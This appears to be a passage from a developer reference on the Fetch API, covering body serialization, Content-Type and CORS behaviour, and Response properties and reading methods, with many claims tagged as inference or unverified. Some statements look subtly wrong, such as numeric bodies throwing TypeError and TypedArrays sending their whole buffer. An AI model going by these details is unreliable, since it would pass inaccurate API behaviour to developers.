## Overview

```

The API will reject this with an invalid content type error.

#### Mistake 3: Sending Binary Data Directly

```javascript
// ❌ WRONG - Trying to send raw binary
const imageBuffer = await file.arrayBuffer();
fetch(url, {
    method: 'POST',
    body: imageBuffer  // Binary data not accepted
});

// ✓ CORRECT - Convert to base64 first
const base64 = btoa(String.fromCharCode(...new Uint8Array(imageBuffer)));
```

### Batch API Considerations

The Batch API also rejects multipart encoding. Batch requests use JSONL (JSON Lines) format where each line is a complete JSON object:

```jsonl
{"custom_id": "req-1", "params": {"model": "claude-sonnet-4-20250514", "messages": [...]}}
{"custom_id": "req-2", "params": {"model": "claude-sonnet-4-20250514", "messages": [...]}}
```

Each request within the batch can contain base64-encoded images or documents, but the batch file itself must be `Content-Type: application/jsonl`.

### Webhook Delivery Format

Webhooks delivering completion notifications also use JSON encoding:

```
POST /webhook-endpoint HTTP/1.1
Content-Type: application/json

{"event": "completion", "request_id": "...", "result": {...}}
```

There are no scenarios where the API produces or consumes multipart form data.

### Protocol Design Philosophy

The JSON-only approach reflects broader API design principles:

1. **Single parsing path**: All requests flow through identical deserialization logic
2. **Schema-driven validation**: JSON Schema validates entire request structure atomically
3. **Developer ergonomics**: Native JSON support in all languages eliminates library dependencies
4. **Cloud-native patterns**: JSON aligns with modern API gateway and serverless architectures

While multipart encoding offers bandwidth advantages for large binary uploads, the API prioritizes simplicity and consistency over marginal efficiency gains for its use cases.

---

## Body Serialization (Fetch Context)

### Body Types and Automatic Serialization

Fetch accepts multiple body formats and applies appropriate serialization based on the input type.

**String Bodies**: Plain strings pass through without transformation. The Content-Type defaults to `text/plain;charset=UTF-8`:

```javascript
fetch(url, {
  method: 'POST',
  body: 'raw string data'
});
```

**FormData**: Automatically serializes to `multipart/form-data` format with boundary markers:

```javascript
const formData = new FormData();
formData.append('username', 'alice');
formData.append('file', fileInput.files[0]);

fetch(url, {
  method: 'POST',
  body: formData  // Content-Type set automatically
});
```

[Inference] The browser generates a unique boundary string and sets Content-Type with the boundary parameter. Manual Content-Type setting for FormData is generally incorrect and breaks parsing.

**URLSearchParams**: Serializes to `application/x-www-form-urlencoded`:

```javascript
const params = new URLSearchParams();
params.append('key', 'value');
params.append('foo', 'bar');

fetch(url, {
  method: 'POST',
  body: params  // Serializes to: key=value&foo=bar
});
```

**Blob/File**: Binary data sends with appropriate MIME type:

```javascript
const blob = new Blob(['binary content'], {type: 'application/octet-stream'});

fetch(url, {
  method: 'POST',
  body: blob
});
```

The blob's type property becomes the Content-Type header if not explicitly overridden.

**ArrayBuffer/TypedArray**: Raw binary data:

```javascript
const buffer = new Uint8Array([1, 2, 3, 4]).buffer;

fetch(url, {
  method: 'POST',
  body: buffer,
  headers: {
    'Content-Type': 'application/octet-stream'
  }
});
```

**ReadableStream**: Streaming upload support:

```javascript
const stream = new ReadableStream({
  start(controller) {
    controller.enqueue('chunk1');
    controller.enqueue('chunk2');
    controller.close();
  }
});

fetch(url, {
  method: 'POST',
  body: stream,
  duplex: 'half'  // Required for streaming uploads
});
```

[Unverified - specification detail] The `duplex: 'half'` option is required for ReadableStream bodies in some implementations.

### JSON Serialization

JSON requires manual serialization since JavaScript objects aren't valid body types:

```javascript
const data = {
  name: 'Alice',
  age: 30,
  tags: ['user', 'admin']
};

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
});
```

**Common Error**: Passing objects directly fails:

```javascript
// INCORRECT - throws TypeError
fetch(url, {
  method: 'POST',
  body: {name: 'Alice'}  // Objects not allowed
});
```

[Inference] The fetch specification requires explicit serialization for object data. This prevents ambiguity about serialization format (JSON vs form-encoded vs other formats).

### Content-Type Header Implications

**Automatic Setting**: FormData and URLSearchParams set Content-Type automatically. Manual setting may conflict:

```javascript
const formData = new FormData();
formData.append('key', 'value');

fetch(url, {
  method: 'POST',
  body: formData,
  headers: {
    'Content-Type': 'multipart/form-data'  // INCORRECT - missing boundary
  }
});
```

[Inference] The manually-set Content-Type lacks the boundary parameter, causing server parsing failures. Omit Content-Type to allow automatic generation.

**Explicit Override**: For string and binary bodies, explicit Content-Type setting is often necessary:

```javascript
fetch(url, {
  method: 'POST',
  body: JSON.stringify(data),
  headers: {
    'Content-Type': 'application/json; charset=utf-8'
  }
});
```

### Character Encoding

**UTF-8 Default**: String bodies encode as UTF-8 by default. The charset parameter in Content-Type reflects this:

```javascript
fetch(url, {
  method: 'POST',
  body: 'text with émojis 🎉',
  headers: {
    'Content-Type': 'text/plain; charset=utf-8'
  }
});
```

**Alternative Encodings**: [Inference] Non-UTF-8 encodings require manual byte-level construction:

```javascript
const encoder = new TextEncoder('iso-8859-1');  // [Unverified - limited encoder support]
const encoded = encoder.encode('text');

fetch(url, {
  method: 'POST',
  body: encoded,
  headers: {
    'Content-Type': 'text/plain; charset=iso-8859-1'
  }
});
```

[Unverified] TextEncoder in browsers typically supports only UTF-8. Alternative encodings may require third-party libraries.

### FormData Serialization Details

**Boundary Generation**: [Inference] The browser generates a pseudo-random boundary string ensuring it doesn't appear in the form data:

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
```

**Part Structure**: Each form field becomes a separate part:

```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="username"

alice
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="document.pdf"
Content-Type: application/pdf

[binary data]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**File Metadata**: File objects include filename and MIME type in their part headers.

### URLSearchParams Encoding

**Key-Value Pairs**: Each parameter encodes with `key=value` format, joined by ampersands:

```javascript
const params = new URLSearchParams();
params.append('name', 'Alice Smith');
params.append('age', '30');

// Serializes to: name=Alice+Smith&age=30
```

**Special Character Encoding**: Spaces become `+`, other special characters use percent-encoding:

```javascript
params.append('email', 'alice@example.com');
// Becomes: email=alice%40example.com
```

**Duplicate Keys**: URLSearchParams allows repeated keys:

```javascript
params.append('tag', 'admin');
params.append('tag', 'user');
// Results in: tag=admin&tag=user
```

[Inference] Server interpretation of duplicate keys varies - some create arrays, others keep only the last value.

### Binary Data Handling

**Blob Construction**: Blobs combine multiple data sources:

```javascript
const blob = new Blob(
  [new Uint8Array([1, 2, 3]), 'text data', new ArrayBuffer(4)],
  {type: 'application/octet-stream'}
);

fetch(url, {
  method: 'POST',
  body: blob
});
```

**Type Detection**: [Inference] File objects (extending Blob) derive type from file extension when available. Manual type setting overrides detection.

**ArrayBuffer vs TypedArray**: Both are valid body types:

```javascript
const buffer = new ArrayBuffer(8);
const view = new Uint8Array(buffer);
view[0] = 255;

// Both valid:
fetch(url, {method: 'POST', body: buffer});
fetch(url, {method: 'POST', body: view});
```

TypedArrays serialize their underlying buffer, not the view metadata.

### Streaming Serialization

**Chunked Transfer**: ReadableStream bodies trigger chunked transfer encoding:

```
Transfer-Encoding: chunked
```

**Progressive Data Generation**:

```javascript
const stream = new ReadableStream({
  async start(controller) {
    for (let i = 0; i < 10; i++) {
      await new Promise(resolve => setTimeout(resolve, 100));
      controller.enqueue(`chunk ${i}\n`);
    }
    controller.close();
  }
});

fetch(url, {
  method: 'POST',
  body: stream,
  duplex: 'half'
});
```

[Inference] This enables uploading large or dynamically-generated data without buffering the complete payload in memory.

**Content-Length Absence**: [Inference] Streamed bodies lack Content-Length headers since total size is unknown at request start. Servers must support chunked encoding or reject the request.

### Size Limitations

**Browser Constraints**: [Unverified - browser-specific] Practical limits exist for body size:

- String bodies limited by JavaScript string size (implementation-dependent)
- ArrayBuffer size limited by available memory
- ReadableStream chunks limited individually but unlimited total

**Server Limits**: [Inference] Server-side constraints typically impose maximum request body sizes (1MB-100MB common ranges). Exceeding limits results in 413 Payload Too Large responses.

### Serialization Performance

**JSON.stringify Cost**: Large object serialization incurs computational cost:

```javascript
const largeArray = Array(100000).fill({
  id: 1,
  name: 'Item',
  nested: {data: [1, 2, 3]}
});

const start = performance.now();
const json = JSON.stringify(largeArray);
const duration = performance.now() - start;
// [Speculation] Duration likely 100ms+ for this size
```

**Streaming Alternative**: [Inference] For very large datasets, streaming JSON serialization (via libraries) or alternative formats (NDJSON, binary) may improve performance.

**FormData Memory**: [Inference] FormData holds references to data rather than immediately serializing. Serialization occurs during fetch execution, potentially creating memory spikes if files are large.

### Special Value Handling

**Undefined and Null**: JSON serialization differs:

```javascript
JSON.stringify({a: undefined, b: null});
// Result: {"b":null}
// Note: undefined properties are omitted
```

**Circular References**: JSON.stringify throws on circular structures:

```javascript
const obj = {name: 'Alice'};
obj.self = obj;

JSON.stringify(obj);  // Throws TypeError: Converting circular structure to JSON
```

[Inference] Solutions include custom replacer functions or libraries handling circular references.

**Date Objects**: Serialize to ISO 8601 strings:

```javascript
JSON.stringify({timestamp: new Date()});
// {"timestamp":"2025-12-16T10:30:00.000Z"}
```

**Binary in JSON**: Binary data requires encoding:

```javascript
const bytes = new Uint8Array([1, 2, 3]);
const base64 = btoa(String.fromCharCode(...bytes));

JSON.stringify({data: base64});
```

### Content Negotiation

**Accept vs Content-Type**: The request body format (Content-Type) is independent from desired response format (Accept):

```javascript
fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',  // Sending JSON
    'Accept': 'application/xml'           // Wanting XML response
  },
  body: JSON.stringify(data)
});
```

### Error Conditions

**Type Errors**: Invalid body types throw TypeError:

```javascript
fetch(url, {
  method: 'POST',
  body: 12345  // Number not allowed - throws TypeError
});
```

**Valid Types**: Only these are accepted:

- String
- Blob
- BufferSource (ArrayBuffer, TypedArray, DataView)
- FormData
- URLSearchParams
- ReadableStream

**Serialization Failures**: JSON.stringify errors prevent request:

```javascript
try {
  fetch(url, {
    method: 'POST',
    body: JSON.stringify(circularObject)
  });
} catch (err) {
  // TypeError caught before fetch executes
}
```

### CORS and Preflight

**Simple Requests**: [Inference] Certain body types and Content-Type values avoid CORS preflight:

- `text/plain`
- `application/x-www-form-urlencoded`
- `multipart/form-data`

**Preflight Triggers**: `application/json` Content-Type triggers preflight:

```javascript
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
});
// Sends OPTIONS preflight before POST
```

[Inference] FormData avoids preflight since `multipart/form-data` is a simple content type, potentially improving performance for cross-origin requests.

### Upload Progress Tracking

**XMLHttpRequest Alternative**: [Unverified] Fetch lacks built-in upload progress events. XMLHttpRequest provides this:

```javascript
const xhr = new XMLHttpRequest();
xhr.upload.addEventListener('progress', (e) => {
  const percent = (e.loaded / e.total) * 100;
  console.log(`Upload: ${percent}%`);
});

xhr.open('POST', url);
xhr.send(formData);
```

**ReadableStream Tracking**: [Inference] Custom ReadableStream implementation can track enqueued byte count:

```javascript
let totalBytes = 0;

const stream = new ReadableStream({
  start(controller) {
    // Track totalBytes as data is enqueued
  }
});
```

### Compression

**Client-Side Compression**: [Inference] Manually compress before sending:

```javascript
// Using CompressionStream API (if available)
const stream = new ReadableStream({
  start(controller) {
    controller.enqueue(JSON.stringify(largeData));
    controller.close();
  }
});

const compressed = stream.pipeThrough(new CompressionStream('gzip'));

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Encoding': 'gzip',
    'Content-Type': 'application/json'
  },
  body: compressed,
  duplex: 'half'
});
```

[Unverified] CompressionStream support varies by browser. May require polyfills or third-party libraries.

**Server Expectations**: [Inference] Servers must support Content-Encoding header to decompress uploaded data. Not all servers accept compressed request bodies.

### Custom Serialization

**Protocol Buffers**: Binary serialization for efficiency:

```javascript
// Using protobuf library
const message = MyMessage.create({field: 'value'});
const buffer = MyMessage.encode(message).finish();

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-protobuf'
  },
  body: buffer
});
```

**MessagePack**: Alternative binary format:

```javascript
// Using msgpack library
const packed = msgpack.encode(data);

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-msgpack'
  },
  body: packed
});
```

[Inference] Binary formats reduce payload size but require server-side support for deserialization.

### Multipart Mixed

**Complex Structures**: [Inference] Beyond simple form data, multipart/mixed allows heterogeneous parts:

```javascript
const boundary = '----CustomBoundary';
const parts = [
  `--${boundary}\r\n`,
  `Content-Type: application/json\r\n\r\n`,
  JSON.stringify({meta: 'data'}),
  `\r\n--${boundary}\r\n`,
  `Content-Type: image/png\r\n\r\n`,
  imageBinaryData,
  `\r\n--${boundary}--`
];

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': `multipart/mixed; boundary=${boundary}`
  },
  body: new Blob(parts)
});
```

This manual construction provides flexibility beyond FormData capabilities but increases complexity.

### Body Reuse and Cloning

**Request Cloning**: Request objects with bodies can clone:

```javascript
const request1 = new Request(url, {
  method: 'POST',
  body: JSON.stringify(data)
});

const request2 = request1.clone();

fetch(request1);
fetch(request2);  // Independent copy
```

[Inference] Cloning duplicates the body stream, allowing multiple sends. Uncloned requests can't reuse consumed bodies.

**Body Stream State**: Bodies are consumed by reading:

```javascript
const request = new Request(url, {
  method: 'POST',
  body: 'data'
});

await fetch(request);
await fetch(request);  // Throws - body already consumed
```

### Security Considerations

**XSS in Serialization**: [Inference] User-controlled data serialized to JSON remains safe from XSS since JSON context doesn't execute code. Risk exists when JSON embeds into HTML:

```javascript
// Safe in fetch body
const body = JSON.stringify({userInput: '<script>alert(1)</script>'});

// Unsafe if embedded in HTML response
const html = `<script>const data = ${body};</script>`;
```

**File Upload Validation**: [Inference] Client-side type checking is insufficient:

```javascript
formData.append('file', file);
// Server must validate actual file content, not just declared MIME type
```

**Size Attacks**: [Speculation] Malicious actors might send extremely large bodies. Client-side limits prevent accidental large uploads, but servers must enforce limits to prevent denial-of-service.

### Abort and Cancellation

**In-Progress Serialization**: Aborting during body serialization terminates the request:

```javascript
const controller = new AbortController();

setTimeout(() => controller.abort(), 100);

fetch(url, {
  method: 'POST',
  body: largeData,
  signal: controller.signal
});
```

[Inference] If JSON.stringify or other serialization is ongoing when abort fires, the fetch promise rejects with AbortError.

**Stream Abortion**: ReadableStream bodies can abort mid-upload:

```javascript
const stream = new ReadableStream({
  async start(controller) {
    for (let i = 0; i < 100; i++) {
      if (shouldAbort) {
        controller.error(new Error('Aborted'));
        return;
      }
      controller.enqueue(`chunk ${i}`);
    }
    controller.close();
  }
});
```

---

# Response Handling

## Response Object Properties

### Core Properties

#### `response.ok`

Boolean indicating successful HTTP status (200-299 range):

```javascript
const response = await fetch(url);

if (response.ok) {
  // Status is 2xx
  const data = await response.json();
} else {
  // Status is outside 2xx range
  console.error('Request failed');
}
```

Equivalent to: `response.status >= 200 && response.status < 300`

#### `response.status`

HTTP status code as integer:

```javascript
const response = await fetch(url);

switch (response.status) {
  case 200:
    console.log('Success');
    break;
  case 201:
    console.log('Created');
    break;
  case 400:
    console.log('Bad Request');
    break;
  case 401:
    console.log('Unauthorized');
    break;
  case 404:
    console.log('Not Found');
    break;
  case 500:
    console.log('Server Error');
    break;
  default:
    console.log(`Status: ${response.status}`);
}
```

#### `response.statusText`

HTTP status message string:

```javascript
const response = await fetch(url);
console.log(response.statusText); // "OK", "Not Found", "Internal Server Error", etc.

// Combining status properties
if (!response.ok) {
  throw new Error(`${response.status} ${response.statusText}`);
}
```

**Note**: Status text can be empty or non-standard depending on server implementation, especially with HTTP/2.

#### `response.headers`

Headers object containing response headers:

```javascript
const response = await fetch(url);

// Get specific header
const contentType = response.headers.get('content-type');
const contentLength = response.headers.get('content-length');

// Check if header exists
if (response.headers.has('x-custom-header')) {
  const value = response.headers.get('x-custom-header');
}

// Iterate all headers
response.headers.forEach((value, key) => {
  console.log(`${key}: ${value}`);
});
```

Headers are case-insensitive:

```javascript
response.headers.get('Content-Type');
response.headers.get('content-type');
response.headers.get('CONTENT-TYPE');
// All return the same value
```

#### `response.url`

Final URL after redirects:

```javascript
const response = await fetch('https://example.com/redirect');
console.log(response.url); // Actual final URL, e.g., "https://example.com/final-destination"
```

Useful for detecting redirects:

```javascript
const requestURL = 'https://example.com/resource';
const response = await fetch(requestURL);

if (response.url !== requestURL) {
  console.log('Request was redirected');
  console.log(`Original: ${requestURL}`);
  console.log(`Final: ${response.url}`);
}
```

#### `response.redirected`

Boolean indicating if response resulted from redirect:

```javascript
const response = await fetch(url);

if (response.redirected) {
  console.log('Response followed redirect(s)');
  console.log(`Redirected to: ${response.url}`);
}
```

#### `response.type`

Response type based on CORS/origin:

```javascript
const response = await fetch(url);
console.log(response.type);
// Possible values: "basic", "cors", "error", "opaque", "opaqueredirect"
```

Response types:

- `"basic"`: Same-origin request
- `"cors"`: Valid CORS cross-origin request
- `"error"`: Network error (fetch Promise rejected)
- `"opaque"`: Cross-origin `no-cors` request (limited information)
- `"opaqueredirect"`: Redirect mode set to `"manual"`

### Body Properties and State

#### `response.body`

ReadableStream of response body:

```javascript
const response = await fetch(url);
const reader = response.body.getReader();

while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  
  console.log('Received chunk:', value);
  // value is Uint8Array
}
```

Used for streaming large responses or processing data incrementally.

#### `response.bodyUsed`

Boolean indicating if body has been read:

```javascript
const response = await fetch(url);
console.log(response.bodyUsed); // false

await response.json();
console.log(response.bodyUsed); // true

// Cannot read again
await response.text(); // Throws TypeError: body already used
```

Checking before reading:

```javascript
if (!response.bodyUsed) {
  const data = await response.json();
}
```

### Body Reading Methods

All body reading methods consume the stream and can only be called once per Response object.

#### `response.json()`

Parses body as JSON, returns Promise:

```javascript
const response = await fetch(url);
const data = await response.json();
```

Throws `SyntaxError` on invalid JSON.

#### `response.text()`

Reads body as text string:

```javascript
const response = await fetch(url);
const text = await response.text();
console.log(text); // Complete response body as string
```

Useful for non-JSON responses like HTML, XML, plain text.

#### `response.blob()`

Reads body as Blob object:

```javascript
const response = await fetch(url);
const blob = await response.blob();

// Use blob for images, files, etc.
const imageUrl = URL.createObjectURL(blob);
const img = document.createElement('img');
img.src = imageUrl;
```

#### `response.arrayBuffer()`

Reads body as ArrayBuffer:

```javascript
const response = await fetch(url);
const buffer = await response.arrayBuffer();

// Work with binary data
const view = new DataView(buffer);
const byte = view.getUint8(0);
```

Useful for binary protocols, file processing, WebAssembly.

#### `response.formData()`

Parses body as FormData object:

```javascript
const response = await fetch(url);
const formData = await response.formData();

// Access form fields
const username = formData.get('username');
const file = formData.get('file');
```

Primarily used when server responds with `multipart/form-data`.

### Response Cloning

#### `response.clone()`

Creates duplicate Response object with separate body stream:

```javascript
const response = await fetch(url);
const clone = response.clone();

// Can now read both independently
const json = await response.json();
const text = await clone.text();
```

Common use cases:

```javascript
// Caching and processing
const response = await fetch(url);
const cacheResponse = response.clone();

cache.put(url, cacheResponse);
const data = await response.json();
```

```javascript
// Error logging with body preservation
async function fetchWithLogging(url) {
  const response = await fetch(url);
  
  if (!response.ok) {
    const errorClone = response.clone();
    const errorText = await errorClone.text();
    logError(response.status, errorText);
  }
  
  return response;
}
```

**Important**: Cannot clone after body is consumed:

```javascript
const response = await fetch(url);
await response.json();
const clone = response.clone(); // Throws TypeError
```

### Headers Object Methods

The Headers object returned by `response.headers` supports:

#### `headers.get(name)`

Returns header value or null:

```javascript
const contentType = response.headers.get('content-type');
const auth = response.headers.get('authorization'); // null if not present
```

#### `headers.has(name)`

Checks header existence:

```javascript
if (response.headers.has('etag')) {
  const etag = response.headers.get('etag');
}
```

#### `headers.forEach(callback)`

Iterates all headers:

```javascript
response.headers.forEach((value, name) => {
  console.log(`${name}: ${value}`);
});
```

#### `headers.entries()`, `headers.keys()`, `headers.values()`

Iterator methods:

```javascript
// Entries
for (const [name, value] of response.headers.entries()) {
  console.log(`${name}: ${value}`);
}

// Keys only
for (const name of response.headers.keys()) {
  console.log(name);
}

// Values only
for (const value of response.headers.values()) {
  console.log(value);
}
```

### Advanced Header Scenarios

#### Parsing Complex Headers

```javascript
// Content-Type with charset
const contentType = response.headers.get('content-type');
const [mimeType, ...params] = contentType.split(';');
const charset = params.find(p => p.trim().startsWith('charset='))
  ?.split('=')[1]
  ?.trim();

console.log(mimeType); // "application/json"
console.log(charset);  // "utf-8"
```

#### Multiple Headers with Same Name

[Inference] The Headers API combines multiple headers with the same name into a single comma-separated value when accessed via `get()`:

```javascript
// Server sends:
// Set-Cookie: session=abc
// Set-Cookie: token=xyz

const cookies = response.headers.get('set-cookie');
// Returns: "session=abc, token=xyz"
```

**Note**: `Set-Cookie` is an exception and may not be accessible in browsers due to security restrictions.

#### Cache-Related Headers

```javascript
const cacheControl = response.headers.get('cache-control');
const etag = response.headers.get('etag');
const lastModified = response.headers.get('last-modified');
const expires = response.headers.get('expires');

// Parse Cache-Control directives
const directives = cacheControl?.split(',').reduce((acc, directive) => {
  const [key, value] = directive.trim().split('=');
  acc[key] = value || true;
  return acc;
}, {});

if (directives['max-age']) {
  const maxAge = parseInt(directives['max-age']);
  console.log(`Cache valid for ${maxAge} seconds`);
}
```

### Response Type Implications

#### Opaque Responses

With `mode: 'no-cors'`, response has limited accessible properties:

```javascript
const response = await fetch(url, { mode: 'no-cors' });

console.log(response.type);        // "opaque"
console.log(response.status);      // 0
console.log(response.statusText);  // ""
console.log(response.ok);          // false
console.log(response.headers);     // Empty Headers object

// Cannot read body
const text = await response.text(); // Returns empty string
```

[Inference] Opaque responses are primarily useful for caching or triggering side effects without needing response data.

### Practical Patterns

#### Comprehensive Status Handling

```javascript
async function handleResponse(response) {
  // Log response metadata
  console.log('Status:', response.status);
  console.log('Type:', response.type);
  console.log('URL:', response.url);
  console.log('Redirected:', response.redirected);
  
  // Check content type
  const contentType = response.headers.get('content-type');
  
  if (!response.ok) {
    let errorMessage = `HTTP ${response.status}: ${response.statusText}`;
    
    if (contentType?.includes('application/json')) {
      const errorData = await response.json();
      errorMessage = errorData.message || errorMessage;
    } else {
      const errorText = await response.text();
      errorMessage = errorText || errorMessage;
    }
    
    throw new Error(errorMessage);
  }
  
  // Parse based on content type
  if (contentType?.includes('application/json')) {
    return await response.json();
  } else if (contentType?.includes('text/')) {
    return await response.text();
  } else if (contentType?.includes('image/')) {
    return await response.blob();
  } else {
    return await response.arrayBuffer();
  }
}
```

#### Response Metadata Extraction

```javascript
function extractMetadata(response) {
  return {
    status: response.status,
    statusText: response.statusText,
    ok: response.ok,
    url: response.url,
    redirected: response.redirected,
    type: response.type,
    headers: Object.fromEntries(response.headers.entries()),
    contentType: response.headers.get('content-type'),
    contentLength: response.headers.get('content-length'),
    etag: response.headers.get('etag'),
    cacheControl: response.headers.get('cache-control'),
  };
}

const response = await fetch(url);
const metadata = extractMetadata(response);
console.log('Response metadata:', metadata);
```

#### Conditional Body Reading

```javascript
async function readResponse(response) {
  if (response.bodyUsed) {
    throw new Error('Response body already consumed');
  }
  
  // Check if there's actually a body
  const contentLength = response.headers.get('content-length');
  if (contentLength === '0' || response.status === 204) {
    return null;
  }
  
  const contentType = response.headers.get('content-type') || '';
  
  if (contentType.includes('application/json')) {
    return await response.json();
  }
  
  if (contentType.includes('text/')) {
    return await response.text();
  }
  
  if (contentType.includes('image/') || 
      contentType.includes('video/') || 
      contentType.includes('audio/')) {
    return await response.blob();
  }
  
  // Default to array buffer for binary data
  return await response.arrayBuffer();
}
```

#### Progress Tracking with Response Body

```javascript
async function fetchWithProgress(url, onProgress) {
  const response = await fetch(url);
  
  const contentLength = response.headers.get('content-length');
  const total = parseInt(contentLength, 10);
  let loaded = 0;
  
  const reader = response.body.getReader();
  const chunks = [];
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    chunks.push(value);
    loaded += value.length;
    
    if (onProgress && total) {
      onProgress({ loaded, total, percentage: (loaded / total) * 100 });
    }
  }
  
  // Combine chunks into single array
  const allChunks = new Uint8Array(loaded);
  let position = 0;
  for (const chunk of chunks) {
    allChunks.set(chunk, position);
    position += chunk.length;
  }
  
  return allChunks;
}

// Usage
const data = await fetchWithProgress('/large-file', ({ percentage }) => {
  console.log(`Download progress: ${percentage.toFixed(2)}%`);
});
```

#### Response Validation Wrapper

```javascript
class ResponseValidator {
  constructor(response) {
    this.response = response;
  }
  
  requireOk() {
    if (!this.response.ok) {
      throw new Error(`HTTP ${this.response.status}`);
    }
    return this;
  }
  
  requireStatus(...allowedStatuses) {
    if (!allowedStatuses.includes(this.response.status)) {
      throw new Error(
        `Expected status ${allowedStatuses.join(' or ')}, got ${this.response.status}`
      );
    }
    return this;
  }
  
  requireContentType(expectedType) {
    const contentType = this.response.headers.get('content-type');
    if (!contentType?.includes(expectedType)) {
      throw new Error(
        `Expected content-type ${expectedType}, got ${contentType}`
      );
    }
    return this;
  }
  
  requireHeader(name) {
    if (!this.response.headers.has(name)) {
      throw new Error(`Required header ${name} not found`);
    }
    return this;
  }
  
  async json() {
    return await this.response.json();
  }
  
  async text() {
    return await this.response.text();
  }
}

// Usage
const data = await new ResponseValidator(response)
  .requireOk()
  .requireContentType('application/json')
  .requireHeader('x-request-id')
  .json();
```

### Response Modification (Service Workers)

In Service Worker context, Response objects can be constructed:

```javascript
// Service Worker example
self.addEventListener('fetch', (event) => {
  if (event.request.url.includes('/api/offline')) {
    event.respondWith(
      new Response(
        JSON.stringify({ offline: true, cached: new Date().toISOString() }),
        {
          status: 200,
          statusText: 'OK',
          headers: {
            'Content-Type': 'application/json',
            'X-Cache': 'service-worker'
          }
        }
      )
    );
  }
});
```

[Inference] Response construction is primarily relevant in Service Worker contexts for implementing custom caching strategies, offline functionality, or request/response manipulation.

---

## Response.ok Property

The `Response.ok` property is a read-only boolean that indicates whether an HTTP response was successful, defined as having a status code in the range of 200-299 (inclusive).

### Basic Characteristics

**Type**: Boolean (read-only)

**Returns**:

- `true` - HTTP status code is between 200-299
- `false` - HTTP status code is outside this range (including redirects, client errors, and server errors)

### Usage Pattern

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
  })
  .then(data => console.log(data))
  .catch(error => console.error('Fetch failed:', error));
```

### Status Code Ranges

**`response.ok === true`** (200-299):

- 200 OK
- 201 Created
- 202 Accepted
- 204 No Content
- 206 Partial Content

**`response.ok === false`** includes:

- 3xx redirects (300-399)
- 4xx client errors (400-499)
- 5xx server errors (500-599)

### Common Patterns

#### Error Handling with ok

```javascript
async function fetchData(url) {
  const response = await fetch(url);
  
  if (!response.ok) {
    throw new Error(`Request failed: ${response.status} ${response.statusText}`);
  }
  
  return response.json();
}
```

#### Checking Before Parsing

```javascript
fetch('/api/users')
  .then(response => {
    // Check ok before attempting to parse
    if (!response.ok) {
      return response.text().then(text => {
        throw new Error(`Error ${response.status}: ${text}`);
      });
    }
    return response.json();
  });
```

#### Custom Error Classes

```javascript
class HTTPError extends Error {
  constructor(response) {
    super(`HTTP Error: ${response.status}`);
    this.response = response;
    this.status = response.status;
    this.statusText = response.statusText;
  }
}

async function fetchWithError(url) {
  const response = await fetch(url);
  if (!response.ok) {
    throw new HTTPError(response);
  }
  return response;
}
```

### Distinction from Network Errors

**Important**: The Fetch API only rejects promises on network failures. HTTP errors (4xx, 5xx) resolve successfully but with `response.ok === false`.

```javascript
fetch('https://example.com/404')
  .then(response => {
    // This executes even for 404
    console.log(response.ok); // false
    console.log(response.status); // 404
  })
  .catch(error => {
    // This only catches network failures
    // NOT HTTP errors like 404, 500, etc.
  });
```

### Comparison with Status Checks

```javascript
// Using response.ok (recommended for success checks)
if (!response.ok) {
  // Handle any non-2xx status
}

// Using response.status (for specific status handling)
if (response.status === 404) {
  // Handle specifically 404
} else if (response.status === 500) {
  // Handle specifically 500
}

// Combining both
if (!response.ok) {
  switch (response.status) {
    case 404:
      throw new Error('Resource not found');
    case 401:
      throw new Error('Unauthorized');
    case 500:
      throw new Error('Server error');
    default:
      throw new Error(`HTTP error: ${response.status}`);
  }
}
```

### Edge Cases and Considerations

#### Redirects

Redirects (3xx) result in `response.ok === false`, but the Fetch API follows redirects by default unless `redirect: 'manual'` is specified.

```javascript
fetch(url, { redirect: 'manual' })
  .then(response => {
    if (response.type === 'opaqueredirect') {
      // Manual redirect handling
    }
  });
```

#### CORS and Opaque Responses

For `no-cors` requests, the response type is 'opaque', and `response.ok` will be `false` even if the request succeeded [Inference: based on opaque response restrictions].

```javascript
fetch(url, { mode: 'no-cors' })
  .then(response => {
    console.log(response.ok); // false
    console.log(response.status); // 0
    console.log(response.type); // 'opaque'
  });
```

#### 204 No Content

Status 204 returns `response.ok === true` but has no body. Attempting to parse will fail.

```javascript
fetch('/api/delete/123')
  .then(response => {
    if (!response.ok) {
      throw new Error('Delete failed');
    }
    // Don't try to parse if 204
    if (response.status === 204) {
      return null;
    }
    return response.json();
  });
```

### Best Practices

**Always check `response.ok`** before parsing the response body:

```javascript
// Good
const response = await fetch(url);
if (!response.ok) throw new Error('Request failed');
const data = await response.json();

// Bad - may attempt to parse error HTML as JSON
const response = await fetch(url);
const data = await response.json(); // Could fail
```

**Provide context in errors**:

```javascript
if (!response.ok) {
  const errorBody = await response.text();
  throw new Error(
    `HTTP ${response.status}: ${response.statusText}\n${errorBody}`
  );
}
```

**Consider retry logic for specific statuses**:

```javascript
async function fetchWithRetry(url, retries = 3) {
  for (let i = 0; i < retries; i++) {
    const response = await fetch(url);
    
    if (response.ok) return response;
    
    // Retry on 5xx server errors, not 4xx client errors
    if (response.status >= 500 && i < retries - 1) {
      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
      continue;
    }
    
    throw new Error(`HTTP ${response.status}`);
  }
}
```

### Interaction with Response Methods

The `response.ok` property should be checked before calling any body-reading methods:

```javascript
const response = await fetch(url);

if (!response.ok) {
  // Still safe to read the body for error details
  const errorText = await response.text();
  throw new Error(errorText);
}

// Safe to parse as expected format
const data = await response.json();
```

### Browser Compatibility

